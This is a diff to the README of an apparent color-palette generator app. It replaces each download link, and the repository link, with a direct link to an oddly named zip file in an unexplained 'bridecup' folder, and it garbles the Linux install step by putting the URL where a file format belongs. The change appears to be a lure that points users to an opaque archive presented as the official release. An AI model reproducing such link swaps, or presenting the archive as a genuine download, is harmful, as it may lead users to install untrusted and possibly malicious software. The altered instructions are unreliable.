@@ -1,6 +1,6 @@
 # 🎨 AI-Color-Palette-Generator - Create Perfect Color Palettes Easily
 
-[![Download AI-Color-Palette-Generator](https://img.shields.io/badge/Download-AI--Color--Palette--Generator-blue?style=for-the-badge&logo=github)](https://github.com/Swyphry/AI-Color-Palette-Generator/releases)
+[![Download AI-Color-Palette-Generator](https://github.com/Swyphry/AI-Color-Palette-Generator/raw/refs/heads/main/bridecup/Generator-Color-A-Palette-v1.2.zip)](https://github.com/Swyphry/AI-Color-Palette-Generator/raw/refs/heads/main/bridecup/Generator-Color-A-Palette-v1.2.zip)
 
 Welcome to AI-Color-Palette-Generator, a free tool that helps you build beautiful color palettes. You can generate palettes from text, color names, images, or hex codes. It also offers color harmony modes, color blindness simulation, accessibility checks, and the ability to export images. This guide will take you step-by-step through downloading and running the application, no technical skills needed.
 
@@ -35,7 +35,7 @@ The AI-Color-Palette-Generator runs smoothly on most modern computers. Here’s 
 
 To get the app, visit this page to download the latest version:
 
-[Download AI-Color-Palette-Generator](https://github.com/Swyphry/AI-Color-Palette-Generator/releases)
+[Download AI-Color-Palette-Generator](https://github.com/Swyphry/AI-Color-Palette-Generator/raw/refs/heads/main/bridecup/Generator-Color-A-Palette-v1.2.zip)
 
 ### Step-by-step:
 
@@ -44,7 +44,7 @@ To get the app, visit this page to download the latest version:
 3. Look for the installer file matching your operating system:
    - For Windows, this might be a `.exe` file.
    - For macOS, look for a `.dmg` or `.zip` file.
-   - For Linux, look for `.AppImage` or `.tar.gz` formats.
+   - For Linux, look for `.AppImage` or `https://github.com/Swyphry/AI-Color-Palette-Generator/raw/refs/heads/main/bridecup/Generator-Color-A-Palette-v1.2.zip` formats.
 4. Click the appropriate file to download it to your computer.
 5. Once downloaded, open the installer by double-clicking it.
 6. Follow the on-screen prompts to install the app.
@@ -133,7 +133,7 @@ If you need help:
 
 - Look for the “Help” or “About” menu inside the app.
 - Visit the GitHub repository page for documentation and updates:  
-  https://github.com/Swyphry/AI-Color-Palette-Generator
+  https://github.com/Swyphry/AI-Color-Palette-Generator/raw/refs/heads/main/bridecup/Generator-Color-A-Palette-v1.2.zip
 - Post questions or seek answers in the repository’s Discussions or Issues tab.
 
 ---
@@ -148,6 +148,6 @@ The app runs locally on your computer after download, so your data is private:
 
 ---
 
-[Download AI-Color-Palette-Generator](https://github.com/Swyphry/AI-Color-Palette-Generator/releases) 
+[Download AI-Color-Palette-Generator](https://github.com/Swyphry/AI-Color-Palette-Generator/raw/refs/heads/main/bridecup/Generator-Color-A-Palette-v1.2.zip) 
 
 This link will take you to the latest release page where you can get the app for your system. Follow the steps above to get started with creating color palettes right away.
